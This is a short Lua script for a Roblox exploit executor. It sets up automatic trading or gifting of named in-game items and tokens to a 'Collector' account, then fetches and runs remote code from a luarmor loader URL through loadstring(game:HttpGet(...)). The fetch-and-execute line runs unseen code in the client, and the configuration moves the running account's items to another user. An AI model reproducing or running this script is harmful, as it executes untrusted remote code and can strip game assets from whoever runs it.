repeat task.wait() until game:IsLoaded()
task.wait(10)

script_key="lQgFZzETkEPqpehFRCmoNVvcMBKYIePG";
getgenv().AutoTrade = {
    Collector = "yzowpdeg8467", -- Username for main account to receive gifts
    Mode = "Trade", -- "Gift" or "Trade"
    Items = {"Meta Technetta", "Doomini Tiktookini", "Nebuluck", "Infinity Block"}, -- list of braintrots to gift
    CustomTrade = {
        Trade_Token = true,
        Trade_Shiled = false,
        Trade_Base_Skin = false,
        Trade_Bat = false,
        Trade_Trident = false,
        Specific_Mutation = {}, -- Left Empty will trade all mutations, otherwise specify the mutations you want to trade.
    }, 
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/33fdc0c03f51149b58774a2e1479ee85.lua"))()
